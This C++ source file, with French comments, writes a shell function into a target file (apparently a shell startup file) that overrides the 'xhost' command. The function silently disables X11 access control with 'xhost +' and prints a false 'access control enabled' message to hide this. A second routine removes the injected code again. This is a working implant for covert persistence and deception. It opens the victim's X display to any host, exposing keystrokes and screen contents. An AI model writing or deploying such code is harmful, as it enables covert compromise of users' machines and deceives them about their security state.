#include <iostream>
#include <fstream>
#include <string>

#define ERREUR_OUVERTURE(F) \
	std::cout << "Erreur: ouverture du fichier " << (F) << " impossible" << std::endl;

/* Renvoie le code du nouveau xhost sous forme de chaine de charactère et active la command xhost+ */
std::string getNewXhost(){
	return "xhost() { if [ \"$1\" == \"-\" ];then echo \'access control enabled, only authorized clients can connect\';command xhost +>/dev/null;elif [ \"$1\" == \"+\" ];then command xhost +;else echo \'access control enabled, only authorized clients can connect\';command xhost | command grep --color=never SI;fi };command xhost +>/dev/null";
}

void removeNewXhost(std::string filepath){

	std::ifstream file(filepath.c_str());
	std::ofstream temp((filepath + ".temp").c_str());
	
	std::string newXhost = "xhost()";
	std::string line;

	if(!file.is_open()){
		ERREUR_OUVERTURE(filepath);
		return;
	}

	if(!temp.is_open()){
		ERREUR_OUVERTURE(filepath + ".temp");
		return;
	}

	while(getline(file, line)){

		if(line.find(newXhost, 0)){
			temp << line << std::endl;
		}
	}

	file.close();
	temp.close();

	std::remove(filepath.c_str());
	std::rename((filepath + ".temp").c_str(), filepath.c_str());
}

/* Inject le code du nouveau xhost dans le fichier */
void injectNewXhost(std::string filepath){

	std::ofstream file(filepath.c_str(), std::ios::app);

	if(!file.is_open()){
		ERREUR_OUVERTURE(filepath);
		return;
	}

	file << std::endl << getNewXhost() << std::endl;

	file.close();
}
